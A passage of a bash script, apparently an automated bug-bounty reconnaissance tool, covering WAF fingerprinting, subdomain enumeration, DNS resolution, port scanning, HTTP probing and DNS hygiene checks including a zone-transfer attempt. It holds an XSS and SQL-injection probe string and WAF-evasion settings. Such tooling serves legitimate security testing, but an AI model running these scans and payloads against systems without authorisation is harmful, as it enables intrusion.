                log_warn "Early WAF probe: wafw00f identified â†’ ${BOLD}${WAF_NAME}${RESET}"
            fi
        else
            log_ok "Early WAF probe: wafw00f found no WAF"
        fi
    fi

    # 5. Apply scan profile adjustments so login + all subsequent requests are WAF-aware
    if $WAF_DETECTED; then
        apply_waf_profile
        log_warn "WAF-aware mode active before login: rate=${RATE_LIMIT} req/s | delay=${WAF_DELAY}s | evasion headers=ON"
    else
        log_ok "Early WAF probe: no WAF detected â€” standard scan profile"
    fi

    _apply_bypass_mode_if_forced
}

# URL-encode a string (Python-backed for reliability)
urlencode() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1" 2>/dev/null || printf '%s' "$1"; }

# Double URL-encode
double_urlencode() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(urllib.parse.quote(sys.argv[1])))" "$1" 2>/dev/null || printf '%s' "$1"; }

# Detect WAF from response headers string â€” prints WAF name or empty string
_waf_from_headers() {
    local h="${1,,}"
    [[ "$h" =~ cf-ray|__cfduid|cloudflare ]]                    && { echo "cloudflare";    return; }
    [[ "$h" =~ x-sucuri-id|x-sucuri-cache ]]                    && { echo "sucuri";        return; }
    [[ "$h" =~ x-iinfo|x-cdn:\ incapsula|incap_ses_ ]]          && { echo "imperva";       return; }
    [[ "$h" =~ x-akamai|akamai-cache-status|x-check-cacheable ]] && { echo "akamai";       return; }
    [[ "$h" =~ x-amzn-requestid|x-amz-cf-id ]]                  && { echo "aws-waf";       return; }
    [[ "$h" =~ x-wa-info|bigipserver|bigipcookie ]]              && { echo "f5-bigip";      return; }
    [[ "$h" =~ barra_counter_session ]]                          && { echo "barracuda";     return; }
    [[ "$h" =~ fortiwafsid ]]                                    && { echo "fortinet";      return; }
    [[ "$h" =~ wfwaf-authcookie ]]                               && { echo "wordfence";     return; }
    [[ "$h" =~ mod.security|noyb ]]                              && { echo "modsecurity";   return; }
    [[ "$h" =~ x-litespeed-cache ]]                              && { echo "litespeed-waf"; return; }
    echo ""
}

# Detect WAF from a blocked-response body â€” prints WAF name or empty string
_waf_from_block_body() {
    local body="${1,,}"
    [[ "$body" =~ cloudflare|attention\ required|cf-error ]]           && { echo "cloudflare"; return; }
    [[ "$body" =~ sucuri\ website\ firewall|access\ denied.*sucuri ]]  && { echo "sucuri";     return; }
    [[ "$body" =~ incapsula|request\ rejected.*imperva ]]              && { echo "imperva";    return; }
    [[ "$body" =~ akamai|reference\ \#[0-9]+ ]]                        && { echo "akamai";     return; }
    [[ "$body" =~ aws\ waf|request\ blocked.*aws ]]                    && { echo "aws-waf";    return; }
    [[ "$body" =~ fortiweb|fortigate|web\ application\ firewall.*fort ]] && { echo "fortinet"; return; }
    [[ "$body" =~ 406\ not\ acceptable|access\ to\ this\ page.*denied ]] && { echo "modsecurity"; return; }
    echo ""
}

# â”€â”€â”€ Phase 4c: WAF Detection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_waf() {
    log_phase "Phase 4c: WAF Detection"
    mkdir -p "$OUTDIR/infra"
    local waf_out="$OUTDIR/infra/waf.txt"

    [[ ! -s "$LIVE_HOSTS" ]] && { log_warn "No live hosts â€” skipping WAF detection."; return; }

    local primary_url; primary_url=$(head -1 "$LIVE_HOSTS")

    # If _early_waf_probe() already identified the WAF (ran before setup_auth),
    # report the known result and skip re-probing the primary host â€” saves time
    # and avoids double-triggering WAF rate limits.
    if $WAF_DETECTED; then
        log_ok "WAF already identified by early probe: ${BOLD}${WAF_NAME}${RESET} â€” skipping primary host re-probe"
        echo "[early-probe] WAF: ${WAF_NAME}" >> "$waf_out"
        # Jump straight to the full live-hosts sweep (step 6 below)
    else
        log_info "Probing ${primary_url} for WAF signatures..."

        # 1. Fetch headers from primary host
        local headers; headers=$(curl -s -I --connect-timeout 10 --max-time 15 \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
            "$primary_url" 2>/dev/null)

        # 2. Header-based fingerprint
        local waf_hdr; waf_hdr=$(_waf_from_headers "$headers")

        # 3. Send WAF-trigger probe (SQLi + XSS in query)
        local probe="${primary_url}/?bbhwaf=<script>alert(1)</script>&id=1'+OR+'1'='1"
        local probe_code; probe_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 "$probe" 2>/dev/null)
        local probe_body; probe_body=$(curl -s --connect-timeout 10 --max-time 10 "$probe" 2>/dev/null | head -80)
        local waf_block; waf_block=""
        if [[ "$probe_code" =~ ^(403|406|429|503|999)$ ]]; then
            waf_block=$(_waf_from_block_body "$probe_body")
            [[ -z "$waf_block" && -n "$probe_code" ]] && waf_block="generic-waf"
        fi

        # 4. Consolidate: header detection wins (more precise), block as fallback
        if [[ -n "$waf_hdr" ]]; then
            WAF_DETECTED=true; WAF_NAME="$waf_hdr"
            log_finding "WAF detected via headers: ${BOLD}${WAF_NAME}${RESET}"
        elif [[ -n "$waf_block" ]]; then
            WAF_DETECTED=true; WAF_NAME="$waf_block"
            log_finding "WAF detected via blocked probe (HTTP ${probe_code}): ${BOLD}${WAF_NAME}${RESET}"
        fi

        # 5. wafw00f â€” authoritative WAF identification (full run with -a)
        log_info "Running wafw00f (mandatory)..."
        local wf_result; wf_result=$(timeout 60 wafw00f -a "$primary_url" 2>/dev/null \
            | grep -iE "detected|is behind" | head -5)
        if [[ -n "$wf_result" ]]; then
            echo "$wf_result" | tee -a "$waf_out"
            local wf_name; wf_name=$(echo "$wf_result" \
                | grep -oiE "(Cloudflare|Akamai|Sucuri|Imperva|Incapsula|AWS|F5 BIG-IP|Barracuda|Fortinet|FortiWeb|Wordfence|ModSecurity|LiteSpeed|Generic)" \
                | head -1 | tr '[:upper:]' '[:lower:]' | tr ' ' '-')
            if [[ -n "$wf_name" ]]; then
                WAF_DETECTED=true
                WAF_NAME="$wf_name"
                log_finding "wafw00f identified WAF: ${BOLD}${WAF_NAME}${RESET}"
            fi
        else
            log_ok "  wafw00f: no WAF detected on ${primary_url}"
            echo "[wafw00f] No WAF detected" >> "$waf_out"
        fi

        # Persist header/probe vars for the WAF report below
        local headers="${headers:-}" waf_hdr="${waf_hdr:-}" waf_block="${waf_block:-}" probe_code="${probe_code:-}"
    fi

    # 6. Quick sweep: check WAF indicators on all live hosts (parallel, non-blocking)
    if [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Sweeping all live hosts for WAF indicators..."
        local waf_hosts_out="$OUTDIR/infra/waf_hosts.txt"
        > "$waf_hosts_out"
        while IFS= read -r url; do
            local h; h=$(curl -s -I --connect-timeout 5 --max-time 8 "$url" 2>/dev/null)
            local w; w=$(_waf_from_headers "$h")
            [[ -n "$w" ]] && echo "$w $url" >> "$waf_hosts_out"
        done < <(head -30 "$LIVE_HOSTS")
        local waf_host_count; waf_host_count=$(wc -l < "$waf_hosts_out" 2>/dev/null || echo 0)
        [[ "$waf_host_count" -gt 0 ]] && log_ok "  Hosts behind WAF: ${waf_host_count} â†’ $waf_hosts_out"
    fi

    # 7. Save WAF report (vars may be unset if early-probe path was taken)
    {
        printf "=== WAF Detection Report ===\nDate: %s\nTarget: %s\nPrimary URL: %s\n\n" \
            "$(date)" "$TARGET" "$primary_url"
        if $WAF_DETECTED; then
            printf "STATUS: WAF DETECTED\nWAF Name: %s\nDetection: header=%s block=%s block-code=%s\n\n" \
                "$WAF_NAME" "${waf_hdr:-n/a}" "${waf_block:-n/a}" "${probe_code:-n/a}"
        else
            printf "STATUS: No WAF detected\nProbe HTTP code: %s\n\n" "${probe_code:-n/a}"
        fi
        printf "=== Response Headers (primary) ===\n%s\n" "${headers:-}"
    } >> "$waf_out"

    # 8. Apply / re-confirm scan profile adjustments
    if $WAF_DETECTED; then
        apply_waf_profile
        log_warn "Scan profile confirmed â†’ rate=${RATE_LIMIT} req/s | delay=${WAF_DELAY}s | payload encoding=ON"
        notify_all "ðŸ›¡ï¸ WAF detected: *${WAF_NAME}* on \`${TARGET}\`
Rate limit: ${RATE_LIMIT} req/s | Delay: ${WAF_DELAY}s | Encoding: ON"
    else
        log_ok "No WAF detected â€” using standard scan profile (${RATE_LIMIT} req/s)"
    fi

    _apply_bypass_mode_if_forced

    log_ok "WAF report â†’ $waf_out"
}

# â”€â”€â”€ Phase 1: Subdomain Enumeration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_recon() {
    log_phase "Phase 1: Subdomain Enumeration â†’ $TARGET"

    # Always seed with the base target so it is never missed downstream
    echo "$TARGET" | anew_append "$ALL_SUBS" >/dev/null

    # Passive: bbot â€” chains subdomain + DNS + cloud + email + portscan modules
    if require_tool bbot; then
        log_info "Running bbot (passive subdomain + cloud + email modules, max 8m)..."
        local _bbot_out="$OUTDIR/recon/bbot"
        mkdir -p "$_bbot_out"
        # Modules: subdomain enumeration + cloud asset discovery + email harvesting
        # Output goes to a dedicated dir; we extract subdomains from the DNS_NAME events
        timeout 480 bbot -t "$TARGET" \
            -m sublist3r baddns baddns_zone certspotter crt chaos columbus \
                  dnsbbrute hackertarget passivetotal shodan_dns urlscan \
                  virustotal wayback \
            --allow-deadly \
            -o "$_bbot_out" \
	    --force \
            -y \
            --silent 2>/dev/null | \
            grep -oP '(?<=\[DNS_NAME\] )\S+' | \
            grep -P "\.${TARGET//./\\.}$" | \
            anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  bbot: ${_n} new subdomains"; } || true
        # Also parse bbot's output files for any subdomains missed from stdout
        find "$_bbot_out" -name "*.txt" 2>/dev/null | xargs grep -hoP '\b\S+\.'"${TARGET//./\\.}"'\b' 2>/dev/null | \
            sort -u | anew_append "$ALL_SUBS" >/dev/null || true
    fi

    # Passive: findomain â€” fast multi-source cert+API subdomain enum
    if require_tool findomain; then
        log_info "Running findomain..."
        findomain -t "$TARGET" -q 2>/dev/null | \
            anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  findomain: ${_n} new"; }
    fi

    # Passive: chaos â€” ProjectDiscovery's chaos dataset (huge pre-built DB)
    if require_tool chaos && [[ -n "${PDCP_API_KEY:-}" ]]; then
        log_info "Running chaos client..."
        chaos -d "$TARGET" -silent -key "$PDCP_API_KEY" 2>/dev/null | \
            anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  chaos: ${_n} new"; }
    fi

    # Passive: Shodan â€” reverse DNS + hostname search
    if require_tool shodan && [[ -n "${SHODAN_API_KEY:-}" ]]; then
        log_info "Querying Shodan for subdomains of ${TARGET}..."
        shodan domain "$TARGET" 2>/dev/null | grep -oP '\S+\.'"${TARGET//./\\.}"'\b' | \
            sort -u | anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  shodan domain: ${_n} new"; }
        # Also search Shodan hostnames index
        shodan search --fields hostnames "hostname:*.${TARGET}" 2>/dev/null | \
            tr ',' '\n' | grep -oP '\S+\.'"${TARGET//./\\.}"'\b' | \
            sort -u | anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  shodan search: ${_n} new"; } || true
    fi

    # Passive: theHarvester â€” OSINT: emails + subdomains via multiple sources
    if require_tool theHarvester; then
        log_info "Running theHarvester (passive, max 3m)..."
        local _harv_out; _harv_out=$(mktemp /tmp/theharvester_XXXXXX.xml)
        timeout 180 theHarvester -d "$TARGET" -b all -f "$_harv_out" 2>/dev/null | \
            grep -oP '\b\S+\.'"${TARGET//./\\.}"'\b' | \
            sort -u | anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  theHarvester: ${_n} new"; } || true
        rm -f "$_harv_out" "${_harv_out%.xml}.json" 2>/dev/null
    fi

    # Passive: subfinder
    if require_tool subfinder; then
        log_info "Running subfinder..."
        subfinder -d "$TARGET" -silent -all -recursive 2>/dev/null | \
            anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  subfinder: ${_n} new"; }
    fi

    # Passive: amass
    if require_tool amass; then
        log_info "Running amass (passive)..."
        timeout 300 amass enum -passive -d "$TARGET" -silent 2>/dev/null | \
            anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  amass passive: ${_n} new"; }
    fi

    # Passive: assetfinder
    if require_tool assetfinder; then
        log_info "Running assetfinder..."
        assetfinder --subs-only "$TARGET" 2>/dev/null | \
            anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  assetfinder: ${_n} new"; }
    fi

    # Passive: crt.sh (certificate transparency)
    log_info "Querying crt.sh (cert transparency)..."
    curl -s --connect-timeout 15 \
        "https://crt.sh/?q=%25.${TARGET}&output=json" 2>/dev/null | \
        python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for entry in data:
        for name in entry.get('name_value','').split('\n'):
            name = name.strip().lstrip('*.')
            if name and '.' in name:
                print(name)
except: pass" 2>/dev/null | sort -u | anew_append "$ALL_SUBS" | wc -l | \
        { read _n; log_ok "  crt.sh: ${_n} new"; }

    # Passive: hackertarget
    log_info "Querying hackertarget..."
    curl -s --connect-timeout 10 \
        "https://api.hackertarget.com/hostsearch/?q=${TARGET}" 2>/dev/null | \
        grep -oP "^[^,]+" | anew_append "$ALL_SUBS" | wc -l | \
        { read _n; log_ok "  hackertarget: ${_n} new"; }

    # Passive: urlscan.io
    log_info "Querying urlscan.io..."
    curl -s --connect-timeout 10 \
        "https://urlscan.io/api/v1/search/?q=domain:${TARGET}&size=200" 2>/dev/null | \
        python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for r in data.get('results', []):
        d = r.get('page', {}).get('domain','')
        if d: print(d)
except: pass" 2>/dev/null | anew_append "$ALL_SUBS" | wc -l | \
        { read _n; log_ok "  urlscan.io: ${_n} new"; }

    # Passive: alienvault OTX
    log_info "Querying AlienVault OTX..."
    curl -s --connect-timeout 10 \
        "https://otx.alienvault.com/api/v1/indicators/domain/${TARGET}/passive_dns" 2>/dev/null | \
        python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for r in data.get('passive_dns', []):
        h = r.get('hostname','')
        if h and h.endswith('.${TARGET}'):
            print(h)
except: pass" 2>/dev/null | anew_append "$ALL_SUBS" | wc -l | \
        { read _n; log_ok "  AlienVault OTX: ${_n} new"; }

    # Active DNS bruteforce
    if ! $SKIP_BRUTEFORCE; then
        local wl=""
        for w in \
            "${WORDLIST_DIR}/Discovery/DNS/subdomains-top1million-20000.txt" \
            "${WORDLIST_DIR}/Discovery/DNS/subdomains-top1million-5000.txt" \
            "/usr/share/dnsrecon/subdomains-top1million-5000.txt" \
            "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt"; do
            [[ -f "$w" ]] && { wl="$w"; break; }
        done

        if [[ -n "$wl" ]]; then
            if require_tool puredns; then
                log_info "DNS bruteforce with puredns (~$(wc -l < "$wl") words, max 10m)..."
                local _puredns_cmd="puredns bruteforce \"$wl\" \"$TARGET\" -r \"$RESOLVERS\" --wildcard-tests 5 --rate-limit 10000 -q"
                timeout 600 puredns bruteforce "$wl" "$TARGET" \
                    -r "$RESOLVERS" \
                    --wildcard-tests 5 \
                    --rate-limit 10000 \
                    -q 2>/dev/null | anew_append "$ALL_SUBS" | wc -l | \
                    { read _n; log_ok "  puredns brute: ${_n} new"; } || \
                    { [[ $? -eq 124 ]] && defer_cmd "puredns bruteforce (timed out at 10m)" "$_puredns_cmd | anew \"$ALL_SUBS\""; true; }
            elif require_tool shuffledns; then
                log_info "DNS bruteforce with shuffledns (max 10m)..."
                local _shuffledns_cmd="shuffledns -d \"$TARGET\" -w \"$wl\" -r \"$RESOLVERS\" -t 1000 -silent"
                timeout 600 shuffledns -d "$TARGET" -w "$wl" -r "$RESOLVERS" -t 1000 -silent 2>/dev/null | \
                    anew_append "$ALL_SUBS" | wc -l | \
                    { read _n; log_ok "  shuffledns: ${_n} new"; } || \
                    { [[ $? -eq 124 ]] && defer_cmd "shuffledns bruteforce (timed out at 10m)" "$_shuffledns_cmd | anew \"$ALL_SUBS\""; true; }
            fi
        fi
    fi

    # Final dedup count
    local total; total=$(sort -u "$ALL_SUBS" 2>/dev/null | wc -l)
    sort -u "$ALL_SUBS" -o "$ALL_SUBS"
    log_ok "Total unique subdomains: ${BOLD}${total}${RESET}"
}

# â”€â”€â”€ Phase 2: DNS Resolution â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_dns() {
    log_phase "Phase 2: DNS Resolution & Validation"

    if [[ ! -s "$ALL_SUBS" ]]; then
        log_warn "No subdomains found, skipping DNS resolution."
        return
    fi

    setup_resolvers

    if require_tool puredns; then
        log_info "Resolving subdomains with puredns..."
        puredns resolve "$ALL_SUBS" \
            -r "$RESOLVERS" \
            --wildcard-tests 5 \
            -q 2>/dev/null > "$RESOLVED_SUBS"
        # Validate output â€” puredns silently writes error messages when massdns
        # is missing. If no valid hostnames came out, fall through to dnsx.
        local _valid; _valid=$(grep -cE '^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$' "$RESOLVED_SUBS" 2>/dev/null || echo 0)
        if [[ "$_valid" -eq 0 ]]; then
            log_warn "puredns produced no valid hostnames â€” falling back to dnsx for resolution"
            > "$RESOLVED_SUBS"
        fi
    fi

    if [[ ! -s "$RESOLVED_SUBS" ]] && require_tool dnsx; then
        log_info "Resolving with dnsx..."
        dnsx -l "$ALL_SUBS" \
            -r "$RESOLVERS" \
            -silent \
            -resp \
            -a -cname \
            -o "$DNS_DIR/dnsx_full.txt" 2>/dev/null | \
            awk '{print $1}' > "$RESOLVED_SUBS"
    fi

    # Last resort: if still empty, use raw subdomain list so downstream phases
    # are not starved (httpx will filter out unresolvable ones itself)
    if [[ ! -s "$RESOLVED_SUBS" ]]; then
        log_warn "No DNS resolver tool found. Using all subdomains as-is."
        grep -E '^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$' "$ALL_SUBS" > "$RESOLVED_SUBS" || cp "$ALL_SUBS" "$RESOLVED_SUBS"
    fi

    # Extract IPs
    if require_tool dnsx; then
        log_info "Extracting IPs and CNAME records..."
        dnsx -l "$RESOLVED_SUBS" -silent -a -resp-only -o "$DNS_DIR/ips.txt" 2>/dev/null || true
        dnsx -l "$RESOLVED_SUBS" -silent -cname -resp-only -o "$DNS_DIR/cnames.txt" 2>/dev/null || true
    fi

    # Permutation enumeration
    if require_tool alterx && [[ -s "$RESOLVED_SUBS" ]]; then
        log_info "Running permutation enumeration (alterx)..."
        cat "$RESOLVED_SUBS" | alterx -silent 2>/dev/null | \
            dnsx -silent -r "$RESOLVERS" 2>/dev/null | \
            anew_append "$RESOLVED_SUBS" | wc -l | \
            { read _n; log_ok "  alterx permutations: ${_n} new"; }
    fi

    local count; count=$(wc -l < "$RESOLVED_SUBS" 2>/dev/null || echo 0)
    sort -u "$RESOLVED_SUBS" -o "$RESOLVED_SUBS"
    log_ok "Resolved hosts: ${BOLD}${count}${RESET}"
}

# â”€â”€â”€ Phase 3: Port Scanning â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_ports() {
    if $SKIP_PORTSCAN; then
        log_warn "Skipping port scan (--skip-portscan)"
        return
    fi

    log_phase "Phase 3: Port Scanning"

    # Prefer unique IPs over hostnames â€” avoids hundreds of DNS failures on resolved subs
    local targets_file="$DNS_DIR/ips.txt"
    [[ ! -s "$targets_file" ]] && targets_file="$RESOLVED_SUBS"
    [[ ! -s "$targets_file" ]] && targets_file="$ALL_SUBS"
    [[ ! -s "$targets_file" ]] && { log_warn "No hosts to scan."; return; }

    local target_count; target_count=$(wc -l < "$targets_file")
    log_info "Port scanning ${target_count} targets (using $(basename "$targets_file"))..."

    # Naabu (fast, ProjectDiscovery)
    if require_tool naabu; then
        log_info "Running naabu (top 1000 ports)..."
        naabu -l "$targets_file" \
            -top-ports 1000 \
            -silent \
            -o "$PORTS_DIR/naabu_open.txt" 2>/dev/null || true
        local open_count; open_count=$(wc -l < "$PORTS_DIR/naabu_open.txt" 2>/dev/null || echo 0)
        log_ok "  naabu found ${open_count} open port/host combos"
    fi

    # Shodan host lookup â€” enriches open port data with banners + vulns (no scan traffic)
    if require_tool shodan && [[ -n "${SHODAN_API_KEY:-}" ]] && [[ -s "$DNS_DIR/ips.txt" ]]; then
        log_info "Shodan host enrichment on discovered IPs..."
        local _shodan_out="$PORTS_DIR/shodan_hosts.txt"
        > "$_shodan_out"
        local _ip_count=0
        while IFS= read -r _ip && [[ $_ip_count -lt 50 ]]; do
            [[ -z "$_ip" || "$_ip" =~ ^# ]] && continue
            shodan host "$_ip" 2>/dev/null | tee -a "$_shodan_out" | \
                grep -E "Port:|CVE-|Vuln" | head -5 || true
            (( _ip_count++ )) || true
        done < "$DNS_DIR/ips.txt"
        local _shodan_vulns; _shodan_vulns=$(grep -c "CVE-" "$_shodan_out" 2>/dev/null || echo 0)
        [[ "$_shodan_vulns" -gt 0 ]] && log_finding "Shodan: ${_shodan_vulns} CVE references found â†’ ${_shodan_out}"
        log_ok "  Shodan enrichment complete â†’ ${_shodan_out}"
    fi

    # Nmap service detection on IPs (max 10 min)
    if require_tool nmap && [[ -s "$targets_file" ]]; then
        log_info "Running nmap service detection (top ports, max 10m)..."
        local _nmap_cmd="nmap -iL \"$targets_file\" -Pn --top-ports 1000 --open --min-rate 5000 --max-retries 1 -T4 --host-timeout 60s -sV --script=http-title,http-headers -oA \"$PORTS_DIR/nmap\""
        timeout 600 nmap -iL "$targets_file" \
            -Pn \
            --top-ports 1000 \
            --open \
            --min-rate 5000 \
            --max-retries 1 \
            --host-timeout 60s \
            -T4 \
            -sV \
            --script=http-title,http-headers \
            -oA "$PORTS_DIR/nmap" \
            2>/dev/null | \
            grep -E "^[0-9]+/(tcp|udp)|Nmap scan report" | \
            tee "$PORTS_DIR/nmap_summary.txt" || \
            { [[ $? -eq 124 ]] && defer_cmd "nmap full scan (timed out)" "$_nmap_cmd"; true; }
        log_ok "  nmap scan complete â†’ $PORTS_DIR/nmap.xml"
    fi
}

# â”€â”€â”€ Phase 4: HTTP Probing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_http() {
    log_phase "Phase 4: HTTP Probing & Fingerprinting"

    local targets_file="$RESOLVED_SUBS"
    [[ ! -s "$targets_file" ]] && targets_file="$ALL_SUBS"

    # Always ensure the base domain is probed regardless of resolution results
    local _combined="$HTTP_DIR/targets_tmp.txt"
    if [[ -s "$targets_file" ]]; then
        grep -E '^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$' "$targets_file" > "$_combined" 2>/dev/null || cp "$targets_file" "$_combined"
    fi
    echo "$TARGET" >> "$_combined"
    sort -u "$_combined" -o "$_combined"
    targets_file="$_combined"

    if ! require_tool httpx; then
        log_warn "httpx not found. Using basic curl probe."
        while read -r host; do
            for proto in https http; do
                code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "${proto}://${host}" 2>/dev/null)
                [[ "$code" =~ ^[23] ]] && echo "${proto}://${host}" >> "$LIVE_HOSTS"
            done
        done < "$targets_file"
        return
    fi

    log_info "Probing with httpx (ports: 80,443,8080,8443,8888,3000,5000,4443)..."
    httpx -l "$targets_file" \
        -p 80,443,8080,8443,8888,3000,5000,4443,9090 \
        -silent \
        -title \
        -status-code \
        -content-length \
        -content-type \
        -web-server \
        -ip \
        -cdn \
        -tech-detect \
        -follow-redirects \
        -random-agent \
        -threads "$THREADS" \
        ${AUTH_HTTPX_OPTS[@]+"${AUTH_HTTPX_OPTS[@]}"} \
        -o "$HTTP_DIR/httpx_full.txt" 2>/dev/null || true

    # Extract clean URL list
    awk '{print $1}' "$HTTP_DIR/httpx_full.txt" 2>/dev/null | sort -u > "$LIVE_HOSTS"

    local live_count; live_count=$(wc -l < "$LIVE_HOSTS" 2>/dev/null || echo 0)
    log_ok "Live web hosts: ${BOLD}${live_count}${RESET}"

    # Also extract 403 responses for later bypass testing
    grep " 403 " "$HTTP_DIR/httpx_full.txt" 2>/dev/null | awk '{print $1}' | \
        sort -u > "$HTTP_DIR/forbidden_hosts.txt" || true

    # Extract hosts by technology for targeted scanning
    grep -i "wordpress" "$HTTP_DIR/httpx_full.txt" 2>/dev/null | awk '{print $1}' | \
        sort -u > "$HTTP_DIR/wordpress_hosts.txt" || true
    grep -i "jenkins\|jira\|confluence\|gitlab" "$HTTP_DIR/httpx_full.txt" 2>/dev/null | \
        awk '{print $1}' | sort -u > "$HTTP_DIR/devtools_hosts.txt" || true
}

# â”€â”€â”€ Phase 4b: Infrastructure â€” TLS, Headers, DNS Hygiene â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_infra() {
    log_phase "Phase 4b: Infrastructure Analysis (TLS / Headers / DNS)"

    mkdir -p "$OUTDIR/infra"
    local infra_dir="$OUTDIR/infra"

    # â”€â”€ TLS/SSL (nuclei ssl templates) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if require_tool nuclei && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Checking TLS/SSL configuration..."
        nuclei -l "$LIVE_HOSTS" \
            -tags ssl \
            -rl "$RATE_LIMIT" -c 20 -j \
            -silent \
            -o "$infra_dir/tls_findings.jsonl" 2>/dev/null || true
        local tls_count; tls_count=$(wc -l < "$infra_dir/tls_findings.jsonl" 2>/dev/null || echo 0)
        [[ "$tls_count" -gt 0 ]] && log_finding "TLS issues: ${BOLD}${tls_count}${RESET} â†’ $infra_dir/tls_findings.jsonl"
    fi

    # â”€â”€ Security Headers (nuclei) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if require_tool nuclei && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Checking security headers..."
        timeout 600 nuclei -l "$LIVE_HOSTS" \
            -tags "misconfig,headers,security-headers" \
            -rl "$RATE_LIMIT" -c 20 -j \
            -timeout 10 -retries 1 \
            -silent \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$infra_dir/header_findings.jsonl" 2>/dev/null || true
        local hdr_count; hdr_count=$(wc -l < "$infra_dir/header_findings.jsonl" 2>/dev/null || echo 0)
        [[ "$hdr_count" -gt 0 ]] && log_finding "Header issues: ${BOLD}${hdr_count}${RESET} â†’ $infra_dir/header_findings.jsonl"
    fi

    # â”€â”€ DNS hygiene: SPF, DMARC, CAA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    log_info "Checking DNS hygiene (SPF / DMARC / CAA)..."
    local dns_hygiene="$infra_dir/dns_hygiene.txt"
    {
        # SPF
        local spf; spf=$(dig +short TXT "$TARGET" 2>/dev/null | grep -i "v=spf1" | head -1)
        if [[ -n "$spf" ]]; then
            echo "[SPF] FOUND: $spf"
        else
            echo "[SPF] MISSING â€” no SPF record on $TARGET"
            log_finding "SPF record missing on $TARGET"
        fi

        # DMARC
        local dmarc; dmarc=$(dig +short TXT "_dmarc.${TARGET}" 2>/dev/null | grep -i "v=DMARC1" | head -1)
        if [[ -n "$dmarc" ]]; then
            echo "[DMARC] FOUND: $dmarc"
            # Check policy
            echo "$dmarc" | grep -qi "p=none" && \
                { echo "[DMARC] WEAK â€” policy is p=none (no enforcement)"; log_finding "DMARC policy is p=none on $TARGET (no enforcement)"; }
        else
            echo "[DMARC] MISSING â€” no DMARC record on $TARGET"
            log_finding "DMARC record missing on $TARGET"
        fi

        # CAA
        local caa; caa=$(dig +short CAA "$TARGET" 2>/dev/null)
        if [[ -n "$caa" ]]; then
            echo "[CAA] FOUND: $caa"
        else
            echo "[CAA] MISSING â€” no CAA record, any CA can issue certs for $TARGET"
            log_finding "CAA record missing on $TARGET"
        fi

        # Zone transfer attempt
        local ns; ns=$(dig +short NS "$TARGET" 2>/dev/null | head -1)
        if [[ -n "$ns" ]]; then
            local axfr; axfr=$(dig axfr "$TARGET" @"$ns" 2>/dev/null | grep -v "^;" | grep -v "^$")
            if echo "$axfr" | grep -qiE "AXFR|SOA"; then
                echo "[ZONE TRANSFER] VULNERABLE â€” zone transfer allowed from $ns"
                log_finding "Zone transfer allowed on $TARGET via $ns"
                echo "$axfr" > "$infra_dir/zone_transfer.txt"
            else
